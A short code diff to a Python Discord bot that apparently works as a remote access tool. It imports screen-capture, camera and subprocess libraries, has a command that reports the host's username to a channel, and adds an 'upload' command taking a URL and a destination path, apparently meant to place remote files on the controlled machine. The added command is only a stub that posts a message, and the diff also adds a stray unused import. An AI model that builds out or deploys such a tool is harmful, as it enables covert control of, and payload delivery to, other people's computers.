@@ -1,3 +1,4 @@
+from re import S
 import discord, os, pyautogui, requests, cv2, numpy, subprocess, threading
 from config import *
 
@@ -142,6 +143,14 @@ def main():
         if ctx.channel.id == channel.id:
             embed = discord.Embed(title="Command Executed", description=f"```{os.getenv('USERNAME')}```", color=0x660cf)
             await ctx.respond(embed=embed)
+
+    @client.slash_command(name="upload", guild_ids=guildid)
+    async def upload(ctx, url, path):
+        try:
+            embed = discord.Embed(title="Uploading File..", description=f"```Url: {url}\nPath: {path}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+        except Exception as error:
+            embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
 
     client.run(token)
 
